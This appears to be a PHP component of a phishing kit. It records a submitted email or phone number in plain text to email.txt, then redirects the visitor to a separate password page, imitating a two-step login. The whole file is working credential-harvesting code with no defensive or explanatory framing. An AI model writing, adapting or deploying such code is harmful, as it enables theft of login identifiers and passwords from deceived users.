<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $email = trim($_POST['email']);

    if (!empty($email)) {
        $file = fopen("email.txt", "a");
        fwrite($file, "Email/Phone: " . $email . "\n");
        fclose($file);
    }

    // Redirect to password page
    header("Location: password.html");
    exit();
}
?>
